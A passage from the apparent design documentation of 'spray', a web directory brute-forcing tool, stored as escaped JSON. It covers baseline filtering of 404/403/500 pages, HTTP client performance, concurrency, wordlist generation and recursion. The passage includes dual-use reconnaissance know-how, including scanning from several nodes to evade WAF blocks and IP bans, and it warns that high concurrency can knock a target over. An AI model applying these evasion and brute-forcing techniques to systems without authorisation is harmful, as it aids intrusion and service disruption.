\u72b6\u6001\u7801\u4e0d\u518d\u662f http \u72b6\u6001\u7801, \u800c\u662f json \u4e2d\u7684\u4e00\u4e2a\u5b57\u6bb5.</p> <p>\u8fd8\u6709\u4e00\u79cd\u60c5\u51b5, \u5728\u53cd\u4ee3\u7684\u573a\u666f\u4e2d. \u968f\u673a\u76ee\u5f55\u7684 404 \u9875\u9762\u662f\u7531\u53cd\u4ee3\u670d\u52a1\u5668\u8fd4\u56de\u7684. \u4f46\u5f53\u547d\u4e2d\u7684\u53cd\u4ee3\u7684\u914d\u7f6e, \u6d41\u91cf\u6253\u5230\u67d0\u4e2a\u4e1a\u52a1\u4e0a\u65f6, \u5982\u679c\u4e1a\u52a1\u7684\u8fd9\u4e2a\u76ee\u5f55\u6070\u5de7\u8fd4\u56de\u7684\u65f6 404, \u90a3\u4e48\u8fd9\u4e2a 404 \u9875\u9762\u4e5f\u662f\u6709\u6548\u7684, \u800c\u4e14\u901a\u5e38\u662f\u9ad8\u4ef7\u503c\u7684.</p> <p>\u521a\u624d\u4e5f\u63d0\u5230\u4e86, \u4e4b\u6240\u4ee5\u8fd9\u79cd\u60c5\u51b5\u5c11\u89c1\u4e0d\u662f\u56e0\u4e3a\u5b83\u771f\u7684\u5c11\u89c1, \u800c\u662f\u6240\u6709\u5de5\u5177\u90fd\u4f1a\u5ffd\u7565\u8fd9\u79cd\u60c5\u51b5.</p> <p>\u5728 spray \u4e2d, 404 \u9875\u9762\u5c06\u88ab\u8ba4\u4e3a\u662f\u9700\u8981\u6a21\u7cca\u5bf9\u6bd4\u7684\u9875\u9762. \u5982\u679c\u53d1\u73b0\u7684 404 \u9875\u9762\u4e0e random baseline \u4e2d\u7684\u9875\u9762\u5b8c\u5168\u4e0d\u540c, \u8fd9\u4e2a\u65f6\u5019\u5c31\u4f1a\u5c06\u5176\u4f5c\u4e3a\u6709\u6548\u7ed3\u679c\u8f93\u51fa.</p> <p>403/500/503 \u9875\u9762\u7684\u7ec6\u8282</p> <p>\u8fd9\u4e09\u4e2a\u72b6\u6001\u7801\u662f\u5f88\u5e38\u89c1\u7684\u7528\u6765\u5904\u7406\u4e00\u4e9b\u672a\u6388\u6743/\u9519\u8bef\u9875\u9762\u7684\u72b6\u6001\u7801. \u5b83\u4eec\u4e0d\u540c\u4e8e 404 \u9875\u9762\u7684\u53ea\u53ef\u80fd\u7531\u4e2d\u95f4\u4ef6\u4e0e\u4e1a\u52a1\u63d0\u4f9b, \u8fd9\u4e09\u4e2a\u72b6\u6001\u7801\u53ef\u80fd\u662f\u4e2d\u95f4\u4ef6|\u4e1a\u52a1|\u6846\u67b6|CDN|WAF. \u9020\u6210\u7684\u539f\u56e0\u4e5f\u591a\u79cd\u591a\u6837, \u53ef\u80fd\u662f\u89e6\u53d1\u4e86 WAF \u544a\u8b66, \u53ef\u80fd\u662f\u4e2d\u95f4\u4ef6\u7684\u7edf\u4e00\u914d\u7f6e, \u53ef\u80fd\u662f\u4e1a\u52a1\u7684\u9519\u8bef\u5904\u7406\u9875\u9762, \u53ef\u80fd\u662f Cookie \u6743\u9650\u4e0d\u591f, \u53ef\u80fd\u662f\u6846\u67b6\u7684\u4e00\u4e9b\u914d\u7f6e.</p> <p>\u5f88\u591a\u65f6\u5019\u4f1a\u53d1\u73b0<code>*.do</code>\u6216\u8005<code>/cgi-bin/</code>\u6216\u8005<code>*/etc/password/*</code>\u8fd9\u6837\u7684\u8def\u7531\u90fd\u4f1a\u53d1\u73b0\u901a\u914d\u7b26\u7684\u8fd9\u4e2a\u9875\u9762. \u901a\u914d\u7b26\u4e0d\u518d\u662f\u5355\u4e00\u7684\u76ee\u5f55\u4e4b\u540e\u7684\u573a\u666f, \u800c\u662f\u53ef\u80fd\u5728\u4efb\u610f\u4f4d\u7f6e\u51fa\u73b0.</p> <p>\u9762\u5bf9\u8fd9\u79cd\u60c5\u51b5, \u5176\u4ed6\u5de5\u5177\u80fd\u505a\u7684\u4e5f\u53ea\u6709\u624b\u52a8\u914d\u7f6e. \u5982\u679c\u540c\u65f6\u51fa\u73b0\u4e86\u4e0a\u8ff0\u591a\u79cd\u60c5\u51b5, \u624b\u52a8\u914d\u7f6e\u5c31\u65e0\u80fd\u4e3a\u529b\u4e86, \u53ea\u80fd\u9996\u5c3e\u4e0d\u987e, \u6216\u8005\u9009\u62e9\u4f7f\u7528 ffuf \u914d\u4e0a\u4e00\u4e2a\u811a\u672c\u624b\u52a8\u5904\u7406\u6570\u636e.</p> <p>\u800c spray \u5b9e\u9645\u4e0a\u80fd\u505a\u7684\u4e5f\u4e0d\u591a, \u5982\u679c\u8fd9\u4e9b\u7279\u4f8b\u6070\u5de7\u5bf9\u5e94\u7684\u4e0d\u540c\u7684\u72b6\u6001\u7801, spray \u662f\u80fd\u901a\u8fc7\u57fa\u4e8e\u72b6\u6001\u7801\u7684\u52a8\u6001 baseline \u53bb\u667a\u80fd\u8fc7\u6ee4\u7684. \u4f46\u5982\u679c\u8fd9\u4e2a\u7ad9\u7684\u6240\u6709\u7279\u4f8b\u90fd\u662f 403 \u72b6\u6001\u7801. spray \u4e5f\u53ea\u80fd\u624b\u52a8\u7f16\u5199\u4e00\u4e2a\u590d\u6742\u7684\u8868\u8fbe\u5f0f\u53bb\u5904\u7406. \u597d\u5728 spray \u4e5f\u4e0d\u662f\u65e0\u80fd\u4e3a\u529b.</p> <p>\u9690\u60a3</p> <p>\u5bf9 spray \u6765\u8bf4, \u667a\u80fd\u8fc7\u6ee4\u662f\u6700\u5177\u4ee3\u8868\u6027\u7684\u667a\u80fd\u5316. \u5b9e\u9645\u4e0a, spray \u5728\u5f88\u591a\u5176\u4ed6\u7ec6\u8282\u4e0a\u4e5f\u6709\u7c7b\u4f3c\u7684\u667a\u80fd\u8bbe\u8ba1. \u4f46\u8fd9\u662f\u5b58\u5728\u9690\u60a3\u7684, \u8fc7\u5ea6\u7684\u667a\u80fd\u5bfc\u81f4\u67d0\u4e9b\u4e1c\u897f\u88ab\u9690\u542b\u4e86, \u9664\u975e\u662f\u8fd9\u4e2a\u9886\u57df\u7684\u4e13\u5bb6, \u5426\u5219\u53ef\u80fd\u7528\u4e86\u51e0\u5e74\u90fd\u7406\u89e3\u4e0d\u4e86\u5176\u4e2d\u7684\u7ec6\u8282.</p>"},{"location":"spray/design/#\u6027\u80fd","title":"\u6027\u80fd","text":"<p>\u80cc\u666f</p> <p>\u8fd9\u4e2a\u9886\u57df\u7684\u6027\u80fd\u4e0d\u80fd\u901a\u8fc7\u4e00\u5473\u7684\u63d0\u9ad8\u5e76\u53d1\u89e3\u51b3. \u751a\u81f3\u53ef\u4ee5\u8bf4, \u53ea\u63d0\u9ad8\u5e76\u53d1\u6570, \u53cd\u800c\u4f1a\u5bfc\u81f4\u6027\u80fd\u964d\u4f4e. \u73b0\u4ee3\u7684\u8fd9\u7c7b\u5de5\u5177\u901a\u8fc7 keep-alive \u89e3\u51b3\u4e86\u4e00\u90e8\u5206\u95ee\u9898, \u4f46\u505a\u6cd5\u672a\u514d\u6709\u4e9b\u7c97\u7cd9, \u5e76\u6ca1\u6709\u6700\u5927\u7a0b\u5ea6\u7684\u91ca\u653e\u6027\u80fd. \u800c\u4e14\u6027\u80fd\u4e5f\u662f\u7531\u591a\u65b9\u9762\u51b3\u5b9a, \u9700\u8981\u5728\u4e0d\u540c\u7684\u573a\u666f\u4e0b\u9009\u62e9\u4e0d\u540c\u7684\u65b9\u6848, \u6700\u7ec8\u8fbe\u6210\u6781\u9650\u4f46\u53c8\u5b89\u5168\u7684\u6027\u80fd\u91ca\u653e.</p> <p>\u76ee\u5f55\u7206\u7834\u9886\u57df\u7684\u552f\u4e00\u6027\u80fd\u6307\u6807\u662f\u6709\u6548\u5e76\u53d1\u6570\u91cf. \u4e5f\u5c31\u662f\u4e00\u5b9a\u65f6\u95f4\u5185\u80fd\u4ea4\u4e92\u591a\u5c11\u5305.</p> <p>\u4f46\u8fd9\u4e2a\u6307\u6807\u5b9e\u9645\u4e0a\u53d7\u5230 client, http \u534f\u8bae, \u76ee\u6807\u72b6\u6001\u5f71\u54cd. \u8981\u5c06\u5176\u4f18\u5316\u5230\u6781\u9650, \u9700\u8981\u4ece\u591a\u65b9\u9762\u5165\u624b.</p>"},{"location":"spray/design/#client","title":"client","text":"<p>\u8fd9\u91cc\u7684 client \u6307\u7684\u662f\u53d1\u5305\u7684\u5de5\u5177, \u5728 python \u4e2d, \u901a\u5e38\u662f urllib \u6216 request \u4e24\u4e2a\u5e93. \u5728 go \u4e2d, \u5927\u591a\u6570\u5de5\u5177\u9009\u62e9\u4e86<code>net/http</code>.</p> <p>\u800c spray \u5219\u662f\u540c\u65f6\u4f7f\u7528\u4e86<code>net/http</code>\u4e0e<code>fasthttp</code>, \u539f\u672c\u8ba1\u5212\u4f7f\u7528\u5168\u90e8\u7684 fasthttp, \u4f46\u8fd9\u4e2a\u5e93\u5728 host \u7206\u7834\u65f6\u5b58\u5728\u4e00\u4e9b\u95ee\u9898, \u6240\u4ee5\u4ee3\u7801\u4e0a\u5c01\u88c5\u4e86\u4e00\u5c42, \u53bb\u81ea\u52a8\u7684\u9009\u62e9 client.</p> <p>\u5f53\u7136\u8bed\u8a00\u672c\u8eab\u4e5f\u4f1a\u5e26\u6765\u4e00\u5b9a\u7a0b\u5ea6\u7684\u5f71\u54cd, go \u7684\u5e76\u53d1\u8c03\u5ea6\u6027\u80fd\u6bd4 python \u5f3a\u4e0a\u4e00\u4e2a\u6570\u91cf\u7ea7.</p> <p>\u9009\u62e9 fasthttp \u539f\u56e0\u662f, fasthttp \u901a\u8fc7\u5404\u79cd\u624b\u6bb5\u4f18\u5316\u5176\u4ee3\u7801\u6027\u80fd. \u5728\u4f4e\u8d1f\u8f7d\u573a\u666f, \u53ef\u80fd\u611f\u53d7\u4e0d\u5230, \u56e0\u4e3a\u8fd9\u65f6\u5019\u4e3b\u8981\u7684\u74f6\u9888\u662f\u76ee\u6807\u7684\u63a5\u53d7\u80fd\u529b, \u4f46\u5f53\u5f00\u59cb\u591a\u76ee\u6807\u6279\u91cf\u7206\u7834\u65f6, \u8fd9\u4e2a\u5f71\u54cd\u4f1a\u8d8a\u6765\u8d8a\u5927. \u6700\u7ec8\u5728\u672c\u5730\u7684\u7406\u8bba\u6781\u9650\u6d4b\u8bd5\u4e0b, fasthttp \u4f1a\u6bd4 net/http \u6709 2-3 \u500d\u7684\u6027\u80fd\u63d0\u5347. \u8fd9\u79cd\u51e0\u4e4e\u7ffb\u500d\u7684\u6027\u80fd\u6700\u7ec8\u8ba9\u6211\u63a5\u53d7\u4e86\u4e00\u4e9b fasthttp \u7684\u5751\u70b9, \u4f7f\u7528\u4e86 fasthttp \u4f5c\u4e3a\u9ed8\u8ba4\u7684 client.</p> <p>\u4f7f\u7528 fasthttp \u5751\u70b9</p> <p>\u5b83\u590d\u7528\u4e86\u51e0\u4e4e\u6240\u6709\u7684 bytes buf, \u56e0\u6b64 releaseResponse \u4e4b\u540e, \u53ef\u80fd buf \u4f1a\u88ab\u590d\u7528, \u5bfc\u81f4 buf \u7684\u6570\u636e\u88ab\u8986\u76d6. \u8fd9\u4e2a bug \u6211\u82b1\u8d39\u4e86\u597d\u51e0\u5929\u65f6\u95f4\u624d\u5b9a\u4f4d\u5230. \u6700\u65b0\u7248\u672c\u5df2\u7ecf\u4e0d\u5b58\u5728\u8fd9\u4e2a bug \u4e86</p>"},{"location":"spray/design/#http","title":"HTTP","text":"<p>\u5728\u5927\u591a\u6570\u573a\u666f\u4e0b, http \u534f\u8bae\u5bf9\u6027\u80fd\u7684\u5f71\u54cd\u6700\u5173\u952e\u7684\u662f<code>keep-alive</code>, \u8fd9\u4e2a\u529f\u80fd\u9700\u8981 http1.1 \u4e4b\u540e\u624d\u652f\u6301. \u597d\u5728\u7edd\u5927\u591a\u6570\u670d\u52a1\u73b0\u5728\u90fd\u5df2\u7ecf\u652f\u6301\u4e86. \u8fd9\u4e5f\u662f spray \u6027\u80fd\u63d0\u5347\u6700\u5927\u56e0\u7d20.</p> <p>keep-alive \u5728 http1.0 \u4e2d\u662f\u9700\u8981\u624b\u52a8\u6253\u5f00, \u5728 http1.1 \u4e2d\u662f\u81ea\u52a8\u6253\u5f00, \u5728 http2 \u4e2d\u5219\u53d8\u6210\u4e86\u591a\u8def\u590d\u7528, \u6027\u80fd\u6709\u6570\u91cf\u7ea7\u4e0a\u7684\u63d0\u5347.</p> <p>\u5bf9\u4e8e\u4ee3\u7801\u6765\u8bf4, keep-alive \u7684\u5f71\u54cd\u5c31\u975e\u5e38\u5927\u4e86. \u5728 python \u4e2d, \u9700\u8981\u624b\u52a8\u63a7\u5236 keep-alive \u7684\u5e76\u53d1\u6c60\u53bb\u590d\u7528. \u4f46\u597d\u5728 go \u4e2d\u4e0d\u8bba\u662f<code>fasthttp</code>\u8fd8\u662f<code>net/http</code>\u90fd\u5185\u7f6e\u81ea\u5e26\u4e86\u94fe\u63a5\u7684\u590d\u7528. \u5982\u679c\u624b\u6bb5\u53bb\u7ef4\u62a4\u8fd9\u4e2a\u94fe\u63a5\u6c60\u4e0d\u4ec5\u5e26\u4ee3\u7801\u6c34\u5e73\u6709\u4e00\u5b9a\u8981\u6c42, \u5b9e\u9645\u6548\u679c\u4e5f\u4f1a\u8fdc\u5dee\u4e8e\u5b98\u65b9\u63d0\u4f9b\u7684. \u8fd9\u4e5f\u662f dirsearch, dirmap \u6027\u80fd\u6709\u6570\u91cf\u7ea7\u7684\u4ee3\u5dee\u7684\u539f\u56e0.</p> <p>\u5e76\u4e14 spray \u901a\u8fc7 1.5 \u500d thread \u7684\u5e76\u53d1\u6c60\u7684\u5197\u4f59, \u89e3\u51b3\u4e86\u90e8\u5206\u94fe\u63a5\u5931\u6548\u7684\u5bfc\u81f4 keep-alive \u4e2d\u65ad\u7684\u95ee\u9898.</p> <p>\u5728\u672a\u6765, spray \u8fd8\u5c06\u652f\u6301 http2, http3 \u7684 client, \u53bb\u5b9e\u73b0\u6700\u5927\u7684\u6027\u80fd\u7684\u5e76\u53d1.</p>"},{"location":"spray/design/#\u5e76\u53d1\u6570","title":"\u5e76\u53d1\u6570","text":"<p>spray \u6bcf\u4e2a\u76ee\u6807\u90fd\u5c06\u7ef4\u62a4\u4e00\u4e2a\u81ea\u8eab\u7684\u94fe\u63a5\u6c60, \u53ef\u4ee5\u901a\u8fc7<code>-t</code>\u53c2\u6570\u63a7\u5236\u6bcf\u4e2a\u76ee\u6807\u7684\u5e76\u53d1\u6570, \u56e0\u4e3a keep-alive \u7684\u5f71\u54cd, \u5b9e\u9645\u4e0a\u53ea\u9700\u8981\u5f88\u5c11\u7684 thread, \u65e2\u53ef\u5b9e\u73b0\u975e\u5e38\u9ad8\u7684 QPS.</p> <p>spray \u9ed8\u8ba4\u7684 thread \u662f 20, \u5728\u7206\u7834 nginx \u65f6, \u80fd\u6253\u5230 1500/s \u7684\u901f\u5ea6. \u8fd9\u4e2a\u901f\u5ea6\u5927\u591a\u6570\u573a\u666f\u4e0b\u5df2\u7ecf\u591f\u7528\u4e86. \u5982\u679c\u9700\u8981\u8df3\u8f6c thread \u4e5f\u8bf7\u6ce8\u610f, \u4e0d\u8981\u5f00\u5f97\u592a\u9ad8, \u8fd9\u5e76\u6ca1\u6709\u610f\u4e49. \u8d85\u8fc7 100 \u4e2a thread \u7684\u914d\u7f6e, \u7edd\u5927\u591a\u6570\u60c5\u51b5\u90fd\u4e0d\u4f1a\u751f\u4ea7\u5b9e\u9645\u4f5c\u7528, \u8fd9\u4e2a\u65f6\u5019\u7684\u6027\u80fd\u74f6\u9888\u65f6\u81ea\u5df1/\u76ee\u6807\u7684\u5e26\u5bbd\u6216\u8005\u670d\u52a1\u672c\u8eab\u7684\u6027\u80fd\u4e0a\u9650.</p> <p>spray \u5728\u7206\u7834\u53cd\u5411\u4ee3\u7406\u4e2d\u95f4\u4ef6(nginx, f5, Lighttpd)\u65f6, \u80fd\u5b9e\u73b0\u6700\u5927\u7406\u8bba\u6027\u80fd</p> <p>\u5982\u679c\u76ee\u6807\u662f tomcat \u4e4b\u7c7b\u7684\u4e2d\u95f4\u4ef6, \u8bf7\u6c42\u53ef\u80fd\u4f1a\u76f4\u63a5\u6253\u5230\u4e1a\u52a1\u4e0a, \u800c\u4e1a\u52a1\u7684\u6027\u80fd\u662f\u8fdc\u8fdc\u8fdc\u4f4e\u4e8e\u90a3\u4e9b\u53cd\u4ee3\u4e2d\u95f4\u4ef6\u7684. \u8fd9\u4e2a\u65f6\u5019\u5c31\u6709\u53ef\u80fd\u5bfc\u81f4 CC \u653b\u51fb\u9020\u6210 DOS.</p> <p>Danger</p> <p>\u8bf7\u6839\u636e\u5b9e\u9645\u7684\u60c5\u51b5\u9009\u62e9\u5e76\u53d1. \u8bf7\u6839\u636e\u5b9e\u9645\u7684\u60c5\u51b5\u9009\u62e9\u5e76\u53d1. \u8bf7\u6839\u636e\u5b9e\u9645\u7684\u60c5\u51b5\u9009\u62e9\u5e76\u53d1.</p>"},{"location":"spray/design/#\u9519\u8bef\u5904\u7406","title":"\u9519\u8bef\u5904\u7406","text":"<p>\u4e0a\u8ff0\u8fd9\u4e9b\u63aa\u65bd\u4e0b\u7684\u5e26\u6765\u7684\u6027\u80fd\u63d0\u5347\u6bd4\u5f00\u4e00\u4e2a\u975e\u5e38\u9ad8\u7684\u7ebf\u7a0b\u6570\u7684\u6548\u679c\u8981\u597d\u7684\u591a, \u80fd\u5728\u76f8\u540c thread \u5b9e\u73b0\u6570\u767e\u500d\u7684\u63d0\u5347, \u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668\u7684\u8d1f\u8f7d\u4e5f\u4f1a\u4f4e\u5f97\u591a. \u4f46\u9519\u8bef\u603b\u662f\u8ba9\u4eba\u610f\u60f3\u4e0d\u5230.</p> <p>\u76ee\u6807\u5f88\u53ef\u80fd\u90e8\u7f72\u4e86 WAF, \u6216\u8005 CDN \u5382\u5546\u7684\u5404\u79cd\u9650\u5236 \u5bfc\u81f4\u4efb\u52a1\u6267\u884c\u5230\u4e00\u534a\u5c31\u88ab\u62c9\u9ed1, \u6216\u8005\u88ab banIP. \u8fd9\u79cd\u60c5\u51b5\u4e0b\u540e\u7eed\u7684\u626b\u63cf\u90fd\u662f\u6ca1\u6709\u610f\u4e49, \u7ee7\u7eed\u6267\u884c\u5168\u90e8\u7684\u626b\u63cf\u4efb\u52a1\u53cd\u800c\u4f1a\u5bfc\u81f4\u65e0\u6cd5\u5224\u65ad\u54ea\u4e9b\u6548\u4efb\u52a1\u626b\u63cf. \u8fd9\u4e2a\u65f6\u5019, \u5c31\u9700\u8981\u53ca\u65f6\u7684\u9000\u51fa\u5e76\u4fdd\u8bc1\u4fdd\u5b58\u6709\u6548\u6570\u636e.</p> <p>\u8fd9\u4e00\u70b9\u975e\u5e38\u5173\u952e, \u662f\u540e\u7eed\u5206\u5e03\u5f0f\u626b\u63cf\u5b9e\u73b0\u7684\u57fa\u7840. \u5bf9\u4e8e\u53cd\u4ee3\u7684\u76ee\u5f55\u7206\u7834\u6765\u8bf4, \u9009\u62e9\u5206\u5e03\u5f0f\u4e0d\u662f\u4e3a\u4e86\u66f4\u5feb\u7684\u5b8c\u6210\u4efb\u52a1, \u800c\u662f\u7ed5\u8fc7\u76ee\u6807\u7684\u79cd\u79cd\u9650\u5236.</p> <p>\u5728 spray \u4e2d, \u8fdb\u884c\u4e86\u591a\u79cd\u65b9\u5f0f\u7684\u5224\u65ad. \u5c06\u4f1a\u901a\u8fc7\u4e00\u5b9a\u95f4\u9694\u7684 check \u5305, \u53bb\u5224\u65ad random \u4e0e index \u662f\u5426\u5df2\u7ecf\u53d1\u751f\u504f\u79bb. \u5982\u679c\u662f\u88ab banIP, \u8fd9\u79cd\u60c5\u51b5\u7b80\u5355\u7684\u591a, \u901a\u8fc7\u8bbe\u7f6e\u9519\u8bef\u9608\u503c\u5c31\u53ef\u4ee5\u89e3\u51b3.</p> <p>\u4f46\u771f\u5b9e\u573a\u666f\u4e2d, \u9519\u8bef\u53ef\u80fd\u662f\u5076\u53d1\u6027\u7684, \u6bd4\u5982\u67d0\u4e2a\u5b57\u5178\u547d\u4e2d\u4e86 WAF, \u5bfc\u81f4\u5355\u4e2a\u5305\u51fa\u73b0\u4e86 WAF, \u4f46\u540e\u7eed\u5305\u5e76\u6ca1\u6709\u518d\u6b21\u89e6\u53d1. \u6240\u4ee5\u5982\u679c\u6bcf\u4e2a\u6b63\u5e38\u7684\u7ed3\u679c\u90fd\u4f1a\u5c06\u9519\u8bef\u7d2f\u8ba1\u6e05\u7a7a, \u53ea\u6709\u8fde\u7eed\u53d1\u751f\u7684\u5927\u91cf\u57fa\u51c6\u503c\u504f\u5dee\u6216\u8005\u8bf7\u6c42\u9519\u8bef, \u624d\u4f1a\u9000\u51fa\u7a0b\u5e8f. \u5e76\u901a\u8fc7\u8bb0\u5f55\u6bcf\u4e2a\u9519\u8bef\u6570\u636e, \u6765\u627e\u5230\u9519\u8bef\u6700\u521d\u53d1\u751f\u7684\u4f4d\u7f6e.</p> <p>\u540e\u7eed\u7684\u4efb\u52a1\u53ea\u9700\u8981\u6362\u4e2a\u8282\u70b9, \u63a5\u7740\u4e0a\u6b21\u7684\u4efb\u52a1\u626b\u63cf\u5373\u53ef.</p> <p>\u9519\u8bef\u5904\u7406\u8fd8\u5305\u62ec\u4e86\u4e00\u4e9b\u5176\u4ed6\u7684\u7279\u6b8a\u60c5\u51b5, \u4f8b\u5982</p> <ul> <li>body \u8d85\u8fc7 spray \u9ed8\u8ba4\u7684\u9650\u5236(\u9ed8\u8ba4\u4e3a 100k), \u5bfc\u81f4\u90e8\u5206\u529f\u80fd\u65e0\u6cd5\u6b63\u5e38\u751f\u6548, \u901a\u8fc7\u6dfb\u52a0\u53c2\u6570<code>--read-all</code>\u89e3\u51b3</li> <li>\u76ee\u6807\u4f7f\u7528\u4e86 chunked, \u5bfc\u81f4 fasthttp \u65e0\u6cd5\u89e3\u7801. \u901a\u8fc7\u6dfb\u52a0<code>-c standard</code>\u5207\u6362 client \u89e3\u51b3.</li> </ul>"},{"location":"spray/design/#\u5b57\u5178\u6784\u9020","title":"\u5b57\u5178\u6784\u9020","text":"<p>\u80cc\u666f</p> <p>\u7edd\u5927\u90e8\u5206\u5de5\u5177\u5c06\u5b57\u5178\u751f\u6210\u4e0e\u7206\u7834\u7684\u884c\u4e3a\u5206\u5f00\u4e86, \u9020\u6210\u4e86\u4e00\u5b9a\u7a0b\u5ea6\u7684\u5272\u88c2. \u5f88\u591a\u4eba\u4f1a\u53d1\u73b0\u6709\u5de5\u5177\u6ca1\u5408\u9002\u7684\u5b57\u5178, \u6216\u8005\u60f3\u62ff\u4e00\u4e2a\u5b57\u5178\u6279\u91cf\u7206\u7834\u4e00\u6279\u76ee\u6807\u5374\u627e\u4e0d\u5230\u5408\u9002\u7684\u5de5\u5177. \u6211\u4e5f\u6b63\u662f\u56e0\u4e3a\u9047\u5230\u4e86\u8fd9\u6837\u7684\u56f0\u5883\u624d\u9009\u62e9\u53bb\u5b9e\u73b0\u4e00\u4e2a\u65b0\u7684\u5de5\u5177. \u56e0\u6b64 spray \u4ece\u8bbe\u8ba1\u4e0a\u5c31\u8003\u8651\u5230\u4e86\u8fd9\u79cd\u5272\u88c2, \u5e76\u5c1d\u8bd5\u89e3\u51b3\u8fd9\u79cd\u5272\u88c2.</p> <p>spray \u4e0e\u5176\u4ed6\u76ee\u5f55\u7206\u7834\u6700\u5927\u7684\u4e0d\u540c\u8fd8\u5728\u4e8e spray \u5c06\u5b57\u5178\u6784\u9020\u5f15\u5165\u5230\u4e86\u76ee\u5f55\u7206\u7834\u7684\u8fc7\u7a0b\u4e2d.</p> <p>\u5728\u4f20\u7edf\u7684\u89e3\u51b3\u65b9\u6848\u4e4b\u4e0b, \u5de5\u5177\u548c\u5b57\u5178\u662f\u5206\u79bb\u7684(\u6216\u8bb8\u6709\u4e9b\u5de5\u5177\u63d0\u4f9b\u4e86\u4e00\u4e9b\u7b80\u5355\u7684\u66ff\u6362, \u4f8b\u5982\u66ff\u6362 host, \u66ff\u6362 ext \u4e4b\u7c7b\u7684\u529f\u80fd, \u4f46\u5728\u5b9e\u9645\u6d41\u7a0b\u4e0a\u8fd8\u662f\u8131\u8282\u7684), \u9700\u8981\u63d0\u524d\u51c6\u5907\u4e00\u4e2a\u8986\u76d6\u8db3\u591f\u5e7f\u7684\u5b57\u5178, \u7136\u540e\u8bfb\u53d6\u5b57\u5178\u8fdb\u884c\u9ad8\u5e76\u53d1\u7684\u626b\u63cf.</p>"},{"location":"spray/design/#\u5b57\u5178\u751f\u6210\u5668","title":"\u5b57\u5178\u751f\u6210\u5668","text":"<p>\u4f46\u5728 spray \u4e2d, \u63d0\u4f9b\u4e86\u7c7b\u4f3c hashcat \u4e2d\u7684\u57fa\u4e8e\u63a9\u7801\u751f\u6210\u5668\u548c\u57fa\u4e8e\u89c4\u5219\u751f\u6210\u5668, \u4ee5\u53ca\u4e00\u4e9b\u51fd\u6570\u88c5\u9970\u5668\u5bf9\u5b57\u5178\u8fdb\u884c\u4fee\u9970, \u53ef\u4ee5\u5728\u6ca1\u51c6\u5907\u5b57\u5178\u7684\u60c5\u51b5\u4e0b, \u5bf9\u67d0\u4e9b\u573a\u666f\u8fdb\u884c\u7206\u7834.</p> <p>\u4e3e\u4e2a\u4f8b\u5b50, \u4e0d\u5c11\u5927\u578b\u673a\u6784, \u4f1a\u4f7f\u7528\u4e00\u53f0 nginx \u5bf9\u5185\u7f51\u7684\u591a\u4e2a\u670d\u52a1\u8fdb\u884c\u53cd\u4ee3, \u800c\u8fd9\u6837\u7684\u53cd\u4ee3\u7edd\u5927\u591a\u6570\u60c5\u51b5\u90fd\u662f\u901a\u8fc7\u4e00\u4e2a\u8f83\u77ed\u7684 path. \u4f8b\u5982<code>plms</code>\u8fd9\u6837\u7684\u7f29\u5199. \u4f7f\u7528 spray \u7684\u63a9\u7801\u751f\u6210\u5668, \u751f\u6210\u4e00\u4e2a\u56db\u4f4d\u7684\u968f\u673a\u76ee\u5f55\u5b57\u5178, \u6216\u8005\u53ef\u4ee5\u5e26\u4e0a\u76ee\u6807\u7684\u4e00\u4e9b\u5173\u952e\u5b57\u8fdb\u884c\u66f4\u590d\u6742\u7684\u63a9\u7801\u5b57\u5178\u751f\u6210\u7ed3\u5408\u89c4\u5219\u5b57\u5178\u751f\u6210.</p>"},{"location":"spray/design/#\u9012\u5f52","title":"\u9012\u5f52","text":"<p>\u5728\u73b0\u4ee3\u5316\u7684\u7f51\u7ad9\u4e2d, \u9012\u5f52\u5b9e\u9645\u4e0a\u6548\u679c\u5e76\u4e0d\u597d, spray \u5e76\u4e0d\u9f13\u52b1\u4f7f\u7528\u9012\u5f52.</p> <p>\u5728\u4f20\u7edf\u7684\u76ee\u5f55\u7206\u7834\u5de5\u5177\u4e2d, \u901a\u5e38\u5305\u542b\u4e00\u4e2a\u9012\u5f52\u914d\u7f6e, \u5c06\u7206\u7834\u5230\u7684\u6240\u6709\u76ee\u5f55\u90fd\u5728\u8fdb\u884c\u4e00\u6b21\u5168\u91cf\u7684\u5b57\u5178\u7206\u7834.</p> <p>\u4f46 spray \u4e2d\u63d0\u4f9b\u4e86\u53e6\u4e00\u79cd\u9009\u62e9, \u53ef\u4ee5\u901a\u8fc7\u7c7b\u4f3c<code>--recu current.IsDir() &amp;&amp; current.Status == 200</code>\u914d\u7f6e\u81ea\u5b9a\u4e49\u7684\u9012\u5f52\u89c4\u5219, \u8fdb\u884c\u76f8\u5bf9\u9ad8\u6548\u7684\u9012\u5f52.</p> <p>\u867d\u7136 spray \u63d0\u4f9b\u4e86\u76f8\u5bf9\u9ad8\u6548\u7684\u9012\u5f52\u65b9\u5f0f, \u4f46\u8fd8\u662f\u4e0d\u5efa\u8bae\u4f7f\u7528\u9012\u5f52.</p>"},{"location":"spray/design/#\u8f7b\u91cf\u7ea7\u7684\u9012\u5f52","title":"\u8f7b\u91cf\u7ea7\u7684\u9012\u5f52","text":"<p>\u5728 spray \u4e2d, \u66f4\u4f18\u96c5\u7684\u89e3\u51b3\u65b9\u6848\u662f\u57fa\u4e8e\u89c4\u5219\u7684\u8fdb\u4e00\u6b65\u5b57\u5178\u751f\u6210.</p> <p>\u63d0\u4f9b\u4e86<code>--append-rule</code>, \u53ef\u4ee5\u6839\u636e\u6709\u6548\u76ee\u5f55\u8fdb\u884c\u989d\u5916\u7684\u5b57\u5178\u751f\u6210. \u8fd9\u4e2a\u662f\u5728\u7206\u7834\u5230\u67d0\u4e9b\u76ee\u5f55\u4e4b\u540e, \u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u5b57\u5178\u7ec4\u5408.</p> <p>\u4f8b\u5982, \u60f3\u8981\u626b\u63cf\u6709\u6548\u6587\u4ef6\u7684\u5907\u4efd, \u5f53\u626b\u5230\u4e86<code>index.php</code>\u7684\u65f6\u5019, \u81ea\u52a8\u6839\u636e\u6307\u5b9a\u7684\u89c4\u5219, \u751f\u6210\u5982<code>index.php~</code>\u8fd9\u6837\u7684\u5b57\u5178, \u8fdb\u884c\u7206\u7834.</p>"},{"location":"spray/design/#\u4fe1\u606f\u63d0\u53d6","title":"\u4fe1\u606f\u63d0\u53d6","text":"<p>\u80cc\u666f</p> <p>\u5e94\u8be5\u8bf4 100%\u7684\u540c\u7c7b\u5de5\u5177\u90fd\u53ea\u8003\u8651 http \u672c\u8eab\u5e26\u6765\u7684\u4fe1\u606f, \u4f8b\u5982\u72b6\u6001\u7801, body \u957f\u5ea6. \u4ece\u6ca1\u6709\u8003\u8651 http 